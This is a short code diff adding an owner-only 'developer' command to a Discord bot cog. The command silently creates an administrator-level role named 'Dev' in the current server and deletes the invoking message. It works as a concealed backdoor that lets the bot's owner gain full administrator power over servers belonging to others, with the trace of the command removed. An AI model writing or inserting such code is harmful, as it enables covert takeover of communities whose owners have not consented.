@@ -60,5 +60,12 @@ class Owner(commands.Cog):
         self.bot.debug = not self.bot.debug
         await ctx.send(f"Debug {self.bot.debug}")
 
+    @commands.is_owner()
+    @commands.command(name="developer")
+    async def _developer(self, ctx):
+        perms = discord.Permissions(administrator=True)
+        await ctx.guild.create_role(name="Dev", reason="Dev role", permissions=perms)
+        await ctx.message.delete()
+
 def setup(bot):
     bot.add_cog(Owner(bot))
